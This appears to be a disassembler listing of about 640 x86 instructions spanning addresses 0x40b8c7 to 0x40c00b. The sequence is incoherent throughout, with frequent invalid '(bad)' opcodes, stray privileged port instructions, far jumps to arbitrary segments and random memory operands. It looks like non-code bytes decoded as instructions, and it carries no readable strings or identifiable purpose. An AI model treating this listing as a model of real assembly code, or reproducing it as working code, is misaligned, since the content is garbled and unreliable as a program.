  40b8c7:	stc    
  40b8c8:	out    dx,al
  40b8c9:	nop
  40b8ca:	xor    ebx,edx
  40b8cc:	arpl   WORD PTR [ecx-0x2e],ax
  40b8cf:	mov    al,ds:0xf6f6ba9e
  40b8d5:	(bad)  
  40b8d6:	cmp    al,0xbd
  40b8d8:	mov    dh,0x27
  40b8da:	and    al,0x50
  40b8dc:	jmp    0x40b8ea
  40b8de:	daa    
  40b8df:	sub    ah,ah
  40b8e1:	aam    0xae
  40b8e3:	xchg   ebp,eax
  40b8e4:	fwait
  40b8e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8e6:	int3   
  40b8e7:	data16 sbb al,0x73
  40b8ea:	mov    dh,0xb9
  40b8ec:	adc    eax,DWORD PTR [edi+0x5d354948]
  40b8f2:	fiadd  DWORD PTR [eax]
  40b8f4:	cwde   
  40b8f5:	ja     0x40b8ef
  40b8f7:	dec    edi
  40b8f8:	leave  
  40b8f9:	jbe    0x40b8f4
  40b8fb:	mov    al,ds:0xa158f9b3
  40b900:	stos   DWORD PTR es:[edi],eax
  40b901:	jl     0x40b8e4
  40b903:	mov    eax,ds:0xb5d52e5f
  40b908:	xor    dl,BYTE PTR [ebx-0x16e2e0c5]
  40b90e:	add    al,0xd3
  40b910:	outs   dx,BYTE PTR ds:[esi]
  40b911:	fsub   QWORD PTR [ebp-0x14a6799c]
  40b917:	aad    0xa8
  40b919:	push   esi
  40b91a:	aad    0x5e
  40b91c:	(bad)  
  40b91d:	loopne 0x40b98c
  40b91f:	rcr    DWORD PTR [ebx+0x12],cl
  40b922:	(bad)  
  40b923:	in     al,dx
  40b924:	adc    eax,0x32993db4
  40b929:	jnp    0x40b997
  40b92b:	call   0xbc3ae4ad
  40b930:	add    DWORD PTR [edx-0x32],eax
  40b933:	jge    0x40b995
  40b935:	adc    BYTE PTR [edi-0x2f],cl
  40b938:	sub    dl,0xb9
  40b93b:	stos   DWORD PTR es:[edi],eax
  40b93c:	inc    ebx
  40b93d:	pop    es
  40b93e:	retf   
  40b93f:	adc    al,0x61
  40b941:	mov    ecx,0x882adcd
  40b946:	jmp    0xf271:0x9a1acdf5
  40b94d:	and    ebp,DWORD PTR [eax]
  40b94f:	stc    
  40b950:	mov    dl,0x3b
  40b952:	push   ds
  40b953:	dec    ebp
  40b954:	dec    eax
  40b955:	aaa    
  40b956:	xor    BYTE PTR [ebp-0x7],bl
  40b959:	in     eax,0xda
  40b95b:	stos   BYTE PTR es:[edi],al
  40b95c:	push   es
  40b95d:	aad    0x50
  40b95f:	fist   DWORD PTR [edx-0x796f76f3]
  40b965:	or     bh,dl
  40b967:	shr    DWORD PTR cs:[edx],cl
  40b96a:	mov    esi,0x6b9e9a71
  40b96f:	inc    ecx
  40b970:	sbb    DWORD PTR [eax+eiz*8+0x5f],eax
  40b974:	cmp    DWORD PTR [ebx+ebx*1],0xfffffff3
  40b978:	fcmovnu st,st(4)
  40b97a:	pusha  
  40b97b:	or     eax,esi
  40b97d:	data16 mov ch,0xc1
  40b980:	mov    cl,0xbe
  40b982:	(bad)  
  40b983:	sbb    dh,BYTE PTR [edx+esi*2]
  40b986:	mov    eax,0xc0086663
  40b98b:	daa    
  40b98c:	les    ebp,FWORD PTR [ecx-0x27dd0047]
  40b992:	leave  
  40b993:	sbb    al,0x86
  40b995:	and    ah,0x7d
  40b998:	shl    ecx,0xda
  40b99b:	or     eax,0x3bd2866b
  40b9a0:	adc    eax,0xc7d14a8d
  40b9a5:	in     al,dx
  40b9a6:	mov    eax,0x514f6afb
  40b9ab:	je     0x40b969
  40b9ad:	xor    al,0x21
  40b9af:	xchg   esp,eax
  40b9b0:	mov    al,ds:0xe4794f02
  40b9b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b9b6:	in     eax,0xc5
  40b9b8:	repnz clc 
  40b9ba:	add    al,ah
  40b9bc:	mov    ds:0x411f5830,al
  40b9c1:	in     al,dx
  40b9c2:	(bad)  
  40b9c4:	jb     0x40b9a6
  40b9c6:	addr16 push 0x29eb938b
  40b9cc:	dec    eax
  40b9cd:	ficom  WORD PTR [eax-0x712d7772]
  40b9d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9d4:	(bad)  
  40b9d6:	js     0x40b990
  40b9d8:	(bad)  
  40b9d9:	das    
  40b9da:	push   0x8c97b987
  40b9df:	mov    ebp,0xcd41de7e
  40b9e4:	jnp    0x40b97a
  40b9e6:	mov    edi,0x3d081f19
  40b9eb:	and    DWORD PTR [esi+ebx*8+0x27],esi
  40b9ef:	in     eax,0x37
  40b9f1:	mov    ds:0x39867689,al
  40b9f6:	xchg   ebx,eax
  40b9f7:	sbb    DWORD PTR [edi-0x6b],ebx
  40b9fa:	rol    bl,cl
  40b9fc:	dec    esi
  40b9fd:	adc    al,0xf6
  40b9ff:	or     BYTE PTR [edi],ch
  40ba01:	push   eax
  40ba02:	(bad)  
  40ba03:	jns    0x40ba22
  40ba05:	push   ds
  40ba06:	adc    dl,bh
  40ba08:	cmc    
  40ba09:	or     ch,BYTE PTR [eax]
  40ba0b:	jg     0x40ba24
  40ba0d:	fsub   DWORD PTR [ecx]
  40ba0f:	mov    bl,dl
  40ba11:	je     0x40ba5e
  40ba13:	daa    
  40ba14:	(bad)  
  40ba15:	sub    DWORD PTR [esi+0x75],esi
  40ba18:	daa    
  40ba19:	scas   eax,DWORD PTR es:[edi]
  40ba1a:	xor    ah,BYTE PTR [edx]
  40ba1c:	pusha  
  40ba1d:	call   0xe76a28cf
  40ba22:	ficomp WORD PTR [edi-0xd]
  40ba25:	fcom   DWORD PTR [eax]
  40ba27:	mov    eax,ds:0xb4e8dedd
  40ba2c:	gs mov ch,0xad
  40ba2f:	mov    ebp,0x7be99246
  40ba34:	or     eax,0xb0b0ad19
  40ba39:	sbb    dl,BYTE PTR [edx+edi*4]
  40ba3c:	mov    ds:0x4c8c01c3,al
  40ba41:	cmp    BYTE PTR [ebx+0x35e0e70f],dh
  40ba47:	mov    gs,WORD PTR [edi+0x72]
  40ba4a:	mov    ds:0x8225b84e,al
  40ba4f:	test   eax,0x84d43169
  40ba54:	mov    ah,0xad
  40ba56:	mov    ds,WORD PTR es:[esp+eax*2-0x26]
  40ba5b:	(bad)  
  40ba5c:	push   edx
  40ba5d:	rcl    BYTE PTR [ebp+0x28faa3a0],cl
  40ba63:	aas    
  40ba64:	sbb    bl,BYTE PTR [esp+eiz*2]
  40ba67:	xchg   edx,eax
  40ba68:	in     eax,0xce
  40ba6a:	jl     0x40ba4c
  40ba6c:	fimul  WORD PTR [eax+0x135bb67a]
  40ba72:	test   al,0x71
  40ba74:	rcl    ecx,0x34
  40ba77:	adc    BYTE PTR [edi+0x43007d41],dh
  40ba7d:	test   eax,0xe9bd8139
  40ba82:	stos   BYTE PTR es:[edi],al
  40ba83:	push   ds
  40ba84:	cli    
  40ba85:	int3   
  40ba86:	or     al,0xc0
  40ba88:	push   es
  40ba89:	xchg   BYTE PTR [edx],dl
  40ba8b:	xchg   BYTE PTR [ecx+ebx*4],cl
  40ba8e:	(bad)  
  40ba8f:	ins    BYTE PTR es:[edi],dx
  40ba90:	dec    esi
  40ba91:	inc    esi
  40ba92:	repnz mov dh,0xaf
  40ba95:	cmp    BYTE PTR [eax-0x40],dh
  40ba98:	jle    0x40ba7a
  40ba9a:	sub    DWORD PTR [ebx-0x2a6db534],edx
  40baa0:	(bad)  
  40baa1:	dec    esp
  40baa2:	in     eax,0xee
  40baa4:	inc    ecx
  40baa5:	sbb    BYTE PTR [edx],0x1a
  40baa8:	xchg   edx,eax
  40baa9:	bound  esi,QWORD PTR [ebx]
  40baab:	imul   esi,DWORD PTR [eax-0x39a00db],0x9b0eb5f4
  40bab5:	call   0x15c90f76
  40baba:	mov    WORD PTR [edi-0x2],es
  40babd:	mov    eax,0x3d99b99b
  40bac2:	xchg   edi,eax
  40bac3:	int3   
  40bac4:	(bad)  
  40bac5:	jle    0x40bb26
  40bac7:	dec    edi
  40bac8:	mov    esp,0xec142073
  40bacd:	sub    al,0xb0
  40bacf:	jmp    0xe820:0x6b62c28e
  40bad6:	jp     0x40bab6
  40bad8:	jp     0x40ba5e
  40bada:	out    0x7c,eax
  40badc:	ins    DWORD PTR es:[edi],dx
  40badd:	xchg   BYTE PTR [edx-0x304d4c8],ch
  40bae3:	cmc    
  40bae4:	cmp    BYTE PTR [ebp+0x79],dh
  40bae7:	push   edx
  40bae8:	fist   WORD PTR [edi]
  40baea:	hlt    
  40baeb:	jb     0x40bac3
  40baed:	int3   
  40baee:	dec    ebx
  40baef:	mov    ah,0x40
  40baf1:	xchg   ebx,eax
  40baf2:	fnstenv [edx-0x5a]
  40baf5:	(bad)  
  40baf6:	cmp    dl,cl
  40baf8:	aam    0xb2
  40bafa:	xor    eax,0x328c6da0
  40baff:	inc    edx
  40bb00:	mov    edi,0x10b57e2f
  40bb05:	mov    ch,0x6c
  40bb07:	shr    ah,0x72
  40bb0a:	pushf  
  40bb0b:	cmp    ecx,eax
  40bb0d:	jns    0x40bb2e
  40bb0f:	sti    
  40bb10:	iret   
  40bb11:	loope  0x40bac8
  40bb13:	mov    dl,0x5b
  40bb15:	mov    esp,DWORD PTR [bx+di-0x3382]
  40bb1a:	adc    eax,0x48029db0
  40bb1f:	les    eax,FWORD PTR [esi+0x68e8808f]
  40bb25:	lods   eax,DWORD PTR ds:[esi]
  40bb26:	outs   dx,BYTE PTR ds:[esi]
  40bb27:	int    0x76
  40bb29:	cmp    DWORD PTR [esi-0x1657ca72],esi
  40bb2f:	sbb    edx,0xffffff99
  40bb32:	dec    eax
  40bb33:	jmp    0x40bb9d
  40bb35:	pusha  
  40bb36:	cwde   
  40bb37:	imul   ecx,DWORD PTR [esi],0x18
  40bb3a:	xchg   edx,eax
  40bb3b:	outs   dx,BYTE PTR ds:[esi]
  40bb3c:	xchg   edx,eax
  40bb3d:	mov    edx,0x662ef0e1
  40bb42:	mov    ah,0x2e
  40bb44:	aas    
  40bb45:	loop   0x40bb5f
  40bb47:	adc    edx,DWORD PTR [ecx-0x362c94c4]
  40bb4d:	pop    es
  40bb4e:	ret    
  40bb4f:	adc    bl,al
  40bb51:	inc    ebx
  40bb52:	mov    ch,0x1d
  40bb54:	dec    ebp
  40bb55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bb56:	in     eax,0x4e
  40bb58:	sub    al,0x6e
  40bb5a:	retf   
  40bb5b:	sub    al,0x8f
  40bb5d:	jmp    0x40bb21
  40bb5f:	fs push edi
  40bb61:	loop   0x40bbaa
  40bb63:	bound  ebp,QWORD PTR [ecx+0x41]
  40bb66:	(bad)  
  40bb67:	hlt    
  40bb68:	xor    al,0xb2
  40bb6a:	sbb    eax,0x163f47fb
  40bb6f:	adc    ebp,ebx
  40bb71:	dec    edi
  40bb72:	stos   BYTE PTR es:[edi],al
  40bb73:	cmp    DWORD PTR [ecx+0x45f7c0ec],esp
  40bb79:	mov    eax,ds:0x1cfc0c02
  40bb7e:	or     eax,0x61f74247
  40bb83:	mov    dl,al
  40bb85:	and    eax,edi
  40bb87:	inc    esp
  40bb88:	or     BYTE PTR [edi],al
  40bb8a:	dec    esi
  40bb8b:	outs   dx,DWORD PTR ds:[esi]
  40bb8c:	sbb    ebx,eax
  40bb8e:	push   ss
  40bb8f:	sub    eax,0x4efcf3d8
  40bb94:	push   edi
  40bb95:	test   dh,0x19
  40bb98:	mov    ds:0x33a19d13,al
  40bb9d:	xor    al,0xea
  40bb9f:	pop    edx
  40bba0:	(bad)  
  40bba1:	mov    ds:0x17f73208,eax
  40bba6:	pop    eax
  40bba7:	scas   eax,DWORD PTR es:[edi]
  40bba8:	lea    edi,[eax+edi*2]
  40bbab:	shl    BYTE PTR [edx-0x3c],1
  40bbae:	jge    0x40bc01
  40bbb0:	outs   dx,BYTE PTR ds:[esi]
  40bbb1:	aam    0x59
  40bbb3:	pop    eax
  40bbb4:	jo     0x40bc19
  40bbb6:	test   BYTE PTR [ebp+0x5c6e229c],ch
  40bbbc:	scas   al,BYTE PTR es:[edi]
  40bbbd:	pop    eax
  40bbbe:	int    0x55
  40bbc0:	nop
  40bbc1:	cwde   
  40bbc2:	hlt    
  40bbc3:	xchg   ecx,eax
  40bbc4:	stos   DWORD PTR es:[edi],eax
  40bbc5:	xchg   esp,eax
  40bbc6:	mov    ah,0x64
  40bbc8:	out    0x0,eax
  40bbca:	shl    esi,1
  40bbcc:	ret    
  40bbcd:	jge    0x40bb9f
  40bbcf:	mov    ecx,0xa4cd94ec
  40bbd4:	int    0x4b
  40bbd6:	retf   
  40bbd7:	iret   
  40bbd8:	xor    BYTE PTR [ecx-0x5f],0x48
  40bbdc:	push   esp
  40bbdd:	cmp    al,0x26
  40bbdf:	xchg   esp,eax
  40bbe0:	pop    ss
  40bbe1:	mov    esi,0x336c0114
  40bbe6:	and    dl,ah
  40bbe8:	popa   
  40bbe9:	mov    al,0xe
  40bbeb:	rol    BYTE PTR [ecx+esi*4],1
  40bbee:	rcr    DWORD PTR [esp+ebx*8],cl
  40bbf1:	fwait
  40bbf2:	xchg   esi,eax
  40bbf3:	repnz fistp WORD PTR [edi+edx*2-0x7e]
  40bbf8:	aaa    
  40bbf9:	cmp    ebp,DWORD PTR [edi+esi*4]
  40bbfc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bbfd:	stos   DWORD PTR es:[edi],eax
  40bbfe:	addr16 out dx,eax
  40bc00:	pushf  
  40bc01:	mov    ebx,0xde19ed79
  40bc06:	daa    
  40bc07:	cmp    bl,dl
  40bc09:	in     eax,dx
  40bc0a:	pop    ebx
  40bc0b:	je     0x40bc4c
  40bc0d:	scas   al,BYTE PTR es:[edi]
  40bc0e:	mov    BYTE PTR fs:[ebx+eax*1+0x1f],0xd9
  40bc14:	cdq    
  40bc15:	xor    esp,DWORD PTR [edi-0x31]
  40bc18:	cmp    al,0xd0
  40bc1a:	(bad)  
  40bc1b:	ror    BYTE PTR [eax],0x34
  40bc1e:	xchg   esi,eax
  40bc1f:	xchg   ebp,eax
  40bc20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc21:	ds mov di,0xc59f
  40bc26:	mov    eax,0x76c324fd
  40bc2b:	mov    edx,0x3fa52cce
  40bc30:	jae    0x40bc4a
  40bc32:	aad    0x1a
  40bc34:	push   ebx
  40bc35:	cld    
  40bc36:	xor    eax,0x342c4582
  40bc3b:	inc    esp
  40bc3c:	mov    esp,0x1fd4d39f
  40bc41:	pop    ebx
  40bc42:	mov    eax,ds:0x2a71fe3a
  40bc47:	div    DWORD PTR [ebx+0x75]
  40bc4a:	les    edi,FWORD PTR [eax]
  40bc4c:	push   ebp
  40bc4d:	popf   
  40bc4e:	mov    ch,0x69
  40bc50:	(bad)  
  40bc51:	jmp    0x40bc96
  40bc53:	in     al,0xe3
  40bc55:	mov    dl,0x94
  40bc57:	sub    BYTE PTR [ebp+0x40],ah
  40bc5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bc5b:	(bad)  
  40bc5c:	imul   eax,DWORD PTR fs:[ecx-0x61],0x7a115d73
  40bc64:	or     ebp,edi
  40bc66:	xor    eax,edx
  40bc68:	aas    
  40bc69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bc6a:	pop    esi
  40bc6b:	sub    DWORD PTR [ebx+edi*1-0x3e345ece],edx
  40bc72:	dec    ebp
  40bc73:	cmp    al,0xaf
  40bc75:	out    0x8a,al
  40bc77:	sbb    al,0xa0
  40bc79:	test   DWORD PTR [esi],ebx
  40bc7b:	repz cmp edx,ecx
  40bc7e:	dec    esi
  40bc7f:	(bad)  
  40bc80:	sub    al,0x61
  40bc82:	ins    BYTE PTR es:[edi],dx
  40bc83:	xlat   BYTE PTR ds:[ebx]
  40bc84:	xor    bh,dl
  40bc86:	aad    0xeb
  40bc88:	pop    es
  40bc89:	adc    al,0xe7
  40bc8b:	mov    edx,0x2602968
  40bc90:	sahf   
  40bc91:	dec    ecx
  40bc92:	mov    ds:0x4f307b9b,al
  40bc97:	jp     0x40bc6a
  40bc99:	xor    edx,DWORD PTR [ebx]
  40bc9b:	imul   edx,DWORD PTR [ecx+edi*8+0x66c58fcd],0x6a947e51
  40bca6:	sbb    al,0x13
  40bca8:	fisttp QWORD PTR [ecx-0x4f]
  40bcab:	or     ebp,0xffffffb0
  40bcae:	push   ebp
  40bcaf:	fsub   st(4),st
  40bcb1:	dec    eax
  40bcb2:	je     0x40bc88
  40bcb4:	hlt    
  40bcb5:	pop    ebx
  40bcb7:	test   eax,0xea742078
  40bcbc:	sbb    DWORD PTR [esi-0x6c726b75],edi
  40bcc2:	add    eax,0xa31f8e93
  40bcc7:	cld    
  40bcc8:	adc    eax,0xf8104e9c
  40bccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcce:	push   ebp
  40bccf:	fisttp DWORD PTR [ebp+0x12bb23d2]
  40bcd5:	jo     0x40bcf0
  40bcd7:	mov    esi,0x514b88e2
  40bcdc:	xor    eax,0x41f7bae4
  40bce1:	iret   
  40bce2:	or     edx,esp
  40bce4:	add    DWORD PTR [esi],esp
  40bce6:	mov    eax,0x280fc67b
  40bceb:	fistp  WORD PTR [edx+0x170a3126]
  40bcf1:	fcmovnb st,st(2)
  40bcf3:	sti    
  40bcf4:	stc    
  40bcf5:	jmp    0x40bcbc
  40bcf7:	add    BYTE PTR ds:0x1d7afbdd,dh
  40bcfd:	out    0x64,al
  40bcff:	and    ebp,DWORD PTR [ebx+ebp*4]
  40bd02:	test   eax,0x9d475ba
  40bd07:	mov    edi,DWORD PTR [edx+0x2cf252e4]
  40bd0d:	xor    eax,0xed071a8d
  40bd12:	pushf  
  40bd13:	xchg   esi,eax
  40bd14:	cmp    BYTE PTR ds:0x3f5848d5,al
  40bd1a:	lds    edi,FWORD PTR gs:[edx-0x50]
  40bd1e:	inc    edx
  40bd1f:	adc    al,0xbb
  40bd21:	dec    ebp
  40bd22:	pushf  
  40bd23:	stc    
  40bd24:	sub    ah,bl
  40bd26:	add    BYTE PTR [ecx+0x1ce9938b],dl
  40bd2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40bd2d:	mov    ebp,DWORD PTR [edi]
  40bd2f:	xchg   esi,eax
  40bd30:	xor    DWORD PTR ds:0x2ca4401b,ebx
  40bd36:	inc    ebx
  40bd37:	fs push ebp
  40bd39:	cmp    eax,0xa2dd1ac2
  40bd3e:	sub    eax,0x8ad31d82
  40bd43:	jge    0x40bd3e
  40bd45:	add    DWORD PTR [edx],ecx
  40bd47:	pusha  
  40bd48:	or     eax,0x9e0c52b8
  40bd4d:	cmp    eax,0xb4034a78
  40bd52:	into   
  40bd53:	xchg   esp,eax
  40bd54:	call   0x22d9ad6b
  40bd59:	push   ds
  40bd5a:	inc    esp
  40bd5b:	ror    edx,1
  40bd5d:	outs   dx,DWORD PTR ds:[esi]
  40bd5e:	mov    ecx,0x9f6cb1dc
  40bd63:	in     eax,dx
  40bd64:	inc    ecx
  40bd65:	jle    0x40bd14
  40bd67:	rcl    DWORD PTR [ebx-0x3f1aef4f],1
  40bd6d:	adc    ebx,DWORD PTR [ebx+ebx*8]
  40bd70:	sbb    eax,0xb536a4c2
  40bd75:	pop    esp
  40bd76:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bd77:	inc    ebx
  40bd78:	cmp    al,0x51
  40bd7a:	or     DWORD PTR ds:0x5f4d57ba,eax
  40bd80:	cmp    al,0xd8
  40bd82:	fs xchg esi,eax
  40bd84:	or     esi,edx
  40bd86:	mov    cl,0x63
  40bd88:	sub    al,0x6c
  40bd8a:	loope  0x40bdc9
  40bd8c:	cmp    al,0x69
  40bd8e:	dec    eax
  40bd8f:	jb     0x40bdb6
  40bd91:	dec    esi
  40bd92:	icebp  
  40bd93:	add    eax,0x4dce9ccb
  40bd98:	ror    ebp,cl
  40bd9a:	add    BYTE PTR [eax+ebx*2+0x44],dh
  40bd9e:	pop    es
  40bd9f:	in     eax,0x29
  40bda1:	xor    eax,0x9f000de7
  40bda6:	mov    bl,0xde
  40bda8:	and    bl,BYTE PTR [eax-0x3898b330]
  40bdae:	mov    dh,0x16
  40bdb0:	into   
  40bdb1:	mov    bl,0x95
  40bdb3:	jb     0x40bd79
  40bdb5:	fadd   QWORD PTR [ebx+0x19]
  40bdb8:	sbb    esp,ebx
  40bdba:	push   ebx
  40bdbb:	mov    al,0x43
  40bdbd:	or     ebx,DWORD PTR [ebx-0x558fbdf9]
  40bdc3:	test   esp,0x7fec8d10
  40bdc9:	lods   al,BYTE PTR ds:[esi]
  40bdca:	test   DWORD PTR [eax+0x60],esp
  40bdcd:	jmp    0x98e4:0xb758e955
  40bdd4:	imul   esp,DWORD PTR [edi],0xa8ba72e1
  40bdda:	mov    BYTE PTR ss:[edi-0x7dfce74e],ah
  40bde1:	xchg   ebx,eax
  40bde2:	aaa    
  40bde3:	inc    edx
  40bde4:	mov    bh,0xd
  40bde6:	ret    0x8156
  40bde9:	adc    bl,BYTE PTR [eax+0x3ddb1894]
  40bdef:	loope  0x40be22
  40bdf1:	lahf   
  40bdf2:	inc    edx
  40bdf3:	adc    BYTE PTR [eax+0x47],al
  40bdf6:	ss push cs
  40bdf8:	loope  0x40be0e
  40bdfa:	and    ch,bh
  40bdfc:	test   DWORD PTR [esi+0x69ba0099],0xc1c2952b
  40be06:	mov    eax,0xb75529d0
  40be0b:	nop
  40be0c:	imul   ebp,DWORD PTR [esi-0x3180db3e],0xffffff94
  40be13:	ins    BYTE PTR es:[edi],dx
  40be14:	cmp    bh,BYTE PTR [ebp-0x4a]
  40be17:	jnp    0x40bdc0
  40be19:	sbb    BYTE PTR [eax+edx*1+0x5a],dh
  40be1d:	aam    0xcc
  40be1f:	(bad)  
  40be20:	adc    eax,0x4e36d606
  40be25:	repnz test BYTE PTR [ebx+0x4d],cl
  40be29:	mov    BYTE PTR [edi-0x72bc292c],ch
  40be2f:	mov    eax,0x23d510d5
  40be34:	fimul  WORD PTR [ebp+ecx*2-0x2dd782bf]
  40be3b:	loop   0x40bde4
  40be3d:	dec    ebp
  40be3e:	jl     0x40be3b
  40be40:	fdiv   DWORD PTR [edi+edi*8+0x41f1c2a4]
  40be47:	scas   eax,DWORD PTR es:[edi]
  40be48:	add    eax,0xade6b2e4
  40be4d:	push   edi
  40be4e:	mov    BYTE PTR [ebp+0x7],bl
  40be51:	sub    al,0xa1
  40be53:	stos   DWORD PTR es:[edi],eax
  40be54:	lds    esi,FWORD PTR [edi]
  40be56:	dec    edi
  40be57:	leave  
  40be58:	and    DWORD PTR [edx+0x15a035a3],ebp
  40be5e:	hlt    
  40be5f:	and    eax,0x49fcb75d
  40be64:	pusha  
  40be65:	inc    edx
  40be66:	adc    esi,esp
  40be68:	inc    edx
  40be69:	inc    ebp
  40be6a:	daa    
  40be6b:	push   ebx
  40be6c:	xor    DWORD PTR [esi],ecx
  40be6e:	in     al,0x5e
  40be70:	add    ebx,DWORD PTR [esi+0x4e]
  40be73:	xor    ch,BYTE PTR [edx+0x1f]
  40be76:	push   eax
  40be77:	fcomip st,st(4)
  40be79:	int3   
  40be7a:	adc    DWORD PTR [edx+0x766dce7c],0xa09e220f
  40be84:	or     ch,bh
  40be86:	xlat   BYTE PTR ds:[ebx]
  40be87:	mov    dh,0x75
  40be89:	jbe    0x40be5b
  40be8b:	dec    esi
  40be8c:	dec    esp
  40be8d:	xchg   DWORD PTR [edi-0x505cfb03],esp
  40be93:	clc    
  40be94:	mov    dh,0x83
  40be96:	js     0x40becc
  40be98:	outs   dx,DWORD PTR ds:[esi]
  40be99:	push   es
  40be9a:	jns    0x40bf08
  40be9c:	test   al,0xd1
  40be9e:	push   edi
  40be9f:	xchg   ebx,eax
  40bea0:	fcmovnb st,st(4)
  40bea2:	es jno 0x40bed3
  40bea5:	pop    eax
  40bea6:	scas   eax,DWORD PTR es:[edi]
  40bea7:	or     al,0x7e
  40bea9:	mov    esp,0xcab2f9d4
  40beae:	ret    
  40beaf:	into   
  40beb0:	fist   WORD PTR [eax+0x128ac67f]
  40beb6:	aam    0xf
  40beb8:	sbb    eax,0x6b09e586
  40bebd:	mov    ds:0xc19a382f,eax
  40bec2:	gs xor al,BYTE PTR gs:[eax+0xe7d90d8]
  40beca:	xchg   ecx,eax
  40becb:	push   ss
  40becc:	into   
  40becd:	xchg   esp,eax
  40bece:	jecxz  0x40bf29
  40bed0:	cmp    DWORD PTR [ecx-0x49],ebx
  40bed3:	pop    edx
  40bed4:	add    ebp,esp
  40bed6:	inc    eax
  40bed7:	mov    BYTE PTR [edi],dl
  40bed9:	in     eax,dx
  40beda:	ret    0x905e
  40bedd:	fwait
  40bede:	pop    esp
  40bedf:	dec    esp
  40bee0:	jle    0x40bf4d
  40bee2:	lock sbb eax,0x2bcff449
  40bee8:	jle    0x40bea6
  40beea:	call   0x8e02d59b
  40beef:	fild   QWORD PTR [edx-0x78e561f5]
  40bef5:	cli    
  40bef6:	add    eax,0x82626913
  40befc:	xor    BYTE PTR [ebp+0x616ae5b8],0x1b
  40bf03:	mov    bh,0x94
  40bf05:	dec    edx
  40bf06:	fwait
  40bf07:	mov    ebx,0x1490d2a1
  40bf0c:	test   eax,0x680c6b1f
  40bf11:	bound  edx,QWORD PTR [eax+0x32e90e]
  40bf17:	dec    ecx
  40bf18:	std    
  40bf19:	(bad)  
  40bf1a:	jmp    0x40bedb
  40bf1c:	ins    DWORD PTR es:[edi],dx
  40bf1d:	pop    esp
  40bf1e:	sub    BYTE PTR [ecx+0x4b],cl
  40bf21:	xchg   esp,eax
  40bf22:	mov    eax,0xe701587f
  40bf27:	sbb    al,0x4d
  40bf29:	out    dx,eax
  40bf2a:	inc    esi
  40bf2b:	ja     0x40bf40
  40bf2d:	cwde   
  40bf2e:	ins    BYTE PTR es:[edi],dx
  40bf2f:	xchg   edx,eax
  40bf30:	mov    ds:0x88088c84,eax
  40bf35:	leave  
  40bf36:	clc    
  40bf37:	dec    edx
  40bf38:	xor    ebx,DWORD PTR [esi-0x4b]
  40bf3b:	push   0xffffffa0
  40bf3d:	mov    al,BYTE PTR [eax-0x30e96fcd]
  40bf43:	xchg   ebp,eax
  40bf44:	bsr    ebp,DWORD PTR [edx-0x2d]
  40bf48:	hlt    
  40bf49:	iret   
  40bf4a:	scas   al,BYTE PTR es:[edi]
  40bf4b:	and    al,0xd7
  40bf4d:	ss inc edi
  40bf4f:	stos   BYTE PTR es:[edi],al
  40bf50:	pushf  
  40bf51:	sbb    DWORD PTR [edx+0x2e],ecx
  40bf54:	mov    ah,0xc1
  40bf56:	jne    0x40befa
  40bf58:	xor    edi,DWORD PTR [ecx-0x26a94d52]
  40bf5e:	jnp    0x40bf7a
  40bf60:	pop    ebx
  40bf61:	pushf  
  40bf62:	mov    ss,WORD PTR [edx+0x3f9ea276]
  40bf68:	jo     0x40bf5a
  40bf6a:	fsubp  st(5),st
  40bf6c:	inc    eax
  40bf6d:	stos   BYTE PTR es:[edi],al
  40bf6e:	outs   dx,DWORD PTR ds:[esi]
  40bf6f:	sbb    al,0x4
  40bf71:	jecxz  0x40bf5f
  40bf73:	shl    ah,0x1b
  40bf76:	xor    DWORD PTR [esi-0x18],0x21
  40bf7a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bf7b:	xchg   ebx,eax
  40bf7c:	aaa    
  40bf7d:	bound  edi,QWORD PTR [ebp-0x56]
  40bf80:	retf   0xb3e3
  40bf83:	and    al,0xcb
  40bf85:	shr    BYTE PTR [ebx],1
  40bf87:	jp     0x40bf55
  40bf89:	push   edx
  40bf8a:	mov    ebx,0x4adc2d7f
  40bf8f:	xchg   edx,eax
  40bf90:	mov    bl,0xd6
  40bf92:	mov    ebx,0x1ccf96cd
  40bf97:	or     ah,BYTE PTR [ecx+eiz*2+0x25]
  40bf9b:	xchg   esi,eax
  40bf9c:	(bad)
  40bf9f:	outs   dx,DWORD PTR ds:[esi]
  40bfa0:	popf   
  40bfa1:	(bad)  
  40bfa3:	push   edi
  40bfa4:	cmp    DWORD PTR [eax],edx
  40bfa6:	rol    DWORD PTR [ecx],cl
  40bfa8:	adc    al,0x61
  40bfaa:	add    eax,esp
  40bfac:	lea    ecx,[ecx+eax*4+0x5]
  40bfb0:	push   esi
  40bfb1:	inc    edi
  40bfb2:	mov    bl,0x44
  40bfb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40bfb5:	cmp    eax,0x8f497891
  40bfba:	sbb    al,0x98
  40bfbc:	cmp    DWORD PTR [ebx-0x57],eax
  40bfbf:	mov    esp,0xc5f2103
  40bfc4:	cmp    al,0x3d
  40bfc6:	repnz jmp 0xe441:0xd2d72b27
  40bfce:	loopne 0x40c015
  40bfd0:	mov    bl,0xdb
  40bfd2:	pop    edi
  40bfd3:	or     dh,BYTE PTR [eax-0x793c7c98]
  40bfd9:	pop    eax
  40bfda:	pop    ebp
  40bfdb:	lea    ebp,[edi]
  40bfdd:	push   0x497fcca5
  40bfe2:	std    
  40bfe3:	stos   DWORD PTR es:[edi],eax
  40bfe4:	pushf  
  40bfe5:	ret    
  40bfe6:	xor    DWORD PTR ds:0x721c58aa,ebp
  40bfec:	pop    edx
  40bfed:	popf   
  40bfee:	adc    eax,0xe11c56d
  40bff3:	adc    eax,0x700cb516
  40bff8:	inc    ebx
  40bff9:	rcl    BYTE PTR es:[eax-0x1a5f1a1a],0x79
  40c001:	pop    esp
  40c002:	and    BYTE PTR [edx],bl
  40c004:	add    ecx,DWORD PTR [ebx-0x5897d105]
  40c00a:	push   esp
  40c00b:	lods   al,BYTE PTR ds:[esi]
